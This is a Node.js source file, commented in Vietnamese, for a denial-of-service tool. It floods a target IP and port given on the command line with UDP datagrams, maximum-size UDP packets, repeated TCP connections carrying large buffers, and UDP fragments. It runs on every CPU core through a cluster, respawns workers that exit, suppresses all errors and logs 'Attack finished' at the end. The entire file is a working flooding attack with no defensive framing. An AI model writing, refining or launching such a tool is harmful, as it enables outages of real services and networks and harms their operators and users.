const dgram = require('dgram');
const net = require('net');
const crypto = require('crypto');
const cluster = require('cluster');
const os = require('os');

// CONFIG
const TARGET = process.argv[2] || '127.0.0.1';
const PORT = parseInt(process.argv[3]) || 80;
const DURATION = parseInt(process.argv[4]) || 30;
const THREADS = parseInt(process.argv[5]) || 128;

// MAX PACKET SIZE
const MAX_PACKET = 65507;
const FRAG_SIZE = 1472;

// PRE-GENERATE PAYLOADS
const PAYLOADS = [];
for (let i = 0; i < 10000; i++) {
    PAYLOADS.push(crypto.randomBytes(FRAG_SIZE));
}

// UDP FLOOD - TỐI ĐA BĂNG THÔNG
function udpMaxFlood() {
    const socket = dgram.createSocket('udp4');
    socket.bind(() => {
        socket.setBroadcast(true);
    });
    
    let startTime = Date.now();
    let count = 0;
    let bytes = 0;
    let lastLog = Date.now();
    
    function send() {
        if (Date.now() - startTime > DURATION * 1000) {
            socket.close();
            return;
        }
        
        // Gửi 50 packet mỗi lần để tăng throughput
        for (let i = 0; i < 500; i++) {
            const payload = PAYLOADS[Math.floor(Math.random() * PAYLOADS.length)];
            socket.send(payload, 0, payload.length, PORT, TARGET, (err) => {
                if (!err) {
                    count++;
                    bytes += payload.length;
                }
            });
        }
        
        setImmediate(send);
    }
    
    send();
    
    setInterval(() => {
        const now = Date.now();
        const elapsed = (now - lastLog) / 1000;
        const speed = (bytes / 1024 / 1024 / elapsed);
        console.log(`[UDP-MAX] Packets: ${count}, Speed: ${speed.toFixed(2)} MB/s`);
        lastLog = now;
        bytes = 0;
    }, 3000);
}

// RAW SOCKET - KHÔNG CHECK ERROR
function rawMaxFlood() {
    const socket = dgram.createSocket('udp4');
    const payload = Buffer.alloc(MAX_PACKET, 'X');
    let startTime = Date.now();
    let count = 0;
    let bytes = 0;
    let lastLog = Date.now();
    
    socket.on('error', () => {});
    
    function send() {
        if (Date.now() - startTime > DURATION * 1000) {
            socket.close();
            return;
        }
        
        // Gửi 100 packet mỗi lần
        for (let i = 0; i < 5000; i++) {
            socket.send(payload, 0, payload.length, PORT, TARGET);
            count++;
            bytes += payload.length;
        }
        
        setImmediate(send);
    }
    
    send();
    
    setInterval(() => {
        const now = Date.now();
        const elapsed = (now - lastLog) / 1000;
        const speed = (bytes / 1024 / 1024 / elapsed);
        console.log(`[RAW-MAX] Packets: ${count}, Speed: ${speed.toFixed(2)} MB/s`);
        lastLog = now;
        bytes = 0;
    }, 3000);
}

// TCP FLOOD - KEEP ALIVE
function tcpMaxFlood() {
    let startTime = Date.now();
    let count = 0;
    let bytes = 0;
    let lastLog = Date.now();
    const sockets = [];
    
    function createConnection() {
        if (Date.now() - startTime > DURATION * 1000) {
            sockets.forEach(s => s.destroy());
            return;
        }
        
        const sock = new net.Socket();
        sock.setKeepAlive(true, 0);
        sock.setNoDelay(true);
        
        sock.connect(PORT, TARGET, () => {
            count++;
            const payload = Buffer.alloc(65536, 'X');
            for (let i = 0; i < 10; i++) {
                sock.write(payload);
                bytes += payload.length;
            }
        });
        
        sock.on('error', () => {});
        sock.on('close', () => {
            setTimeout(createConnection, 1);
        });
        
        sockets.push(sock);
        setTimeout(createConnection, 1);
    }
    
    // Tạo 1000 connection
    for (let i = 0; i < 5000; i++) {
        setTimeout(createConnection, i);
    }
    
    setInterval(() => {
        const now = Date.now();
        const elapsed = (now - lastLog) / 1000;
        const speed = (bytes / 1024 / 1024 / elapsed);
        console.log(`[TCP-MAX] Connections: ${count}, Speed: ${speed.toFixed(2)} MB/s`);
        lastLog = now;
        bytes = 0;
    }, 3000);
}

// UDP FRAGMENTATION
function fragMaxFlood() {
    const socket = dgram.createSocket('udp4');
    let startTime = Date.now();
    let count = 0;
    let bytes = 0;
    let lastLog = Date.now();
    
    function send() {
        if (Date.now() - startTime > DURATION * 1000) {
            socket.close();
            return;
        }
        
        // Gửi 100 fragment
        for (let i = 0; i < 500; i++) {
            const payload = crypto.randomBytes(FRAG_SIZE);
            socket.send(payload, 0, payload.length, PORT, TARGET);
            count++;
            bytes += payload.length;
        }
        
        setImmediate(send);
    }
    
    send();
    
    setInterval(() => {
        const now = Date.now();
        const elapsed = (now - lastLog) / 1000;
        const speed = (bytes / 1024 / 1024 / elapsed);
        console.log(`[FRAG-MAX] Packets: ${count}, Speed: ${speed.toFixed(2)} MB/s`);
        lastLog = now;
        bytes = 0;
    }, 3000);
}

// MAIN
console.log(`[START] Target: ${TARGET}:${PORT}, Duration: ${DURATION}s, Threads: ${THREADS}`);
console.log(`[INFO] MAX POWER - Bypass Bandwidth Limit (1Gbps+)`);

const numCPUs = os.cpus().length;
const threadsPerCPU = Math.ceil(THREADS / numCPUs);

if (cluster.isMaster) {
    // Fork workers
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }
    
    cluster.on('exit', (worker) => {
        cluster.fork();
    });
    
    setTimeout(() => {
        console.log('[STOP] Attack finished');
        process.exit(0);
    }, DURATION * 1000 + 1000);
    
} else {
    // Mỗi worker chạy nhiều threads
    const methods = [udpMaxFlood, rawMaxFlood, tcpMaxFlood, fragMaxFlood];
    
    for (let i = 0; i < threadsPerCPU; i++) {
        const method = methods[i % methods.length];
        setTimeout(() => {
            method();
        }, i * 2);
    }
    
    setTimeout(() => {
        process.exit(0);
    }, DURATION * 1000 + 2000);
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});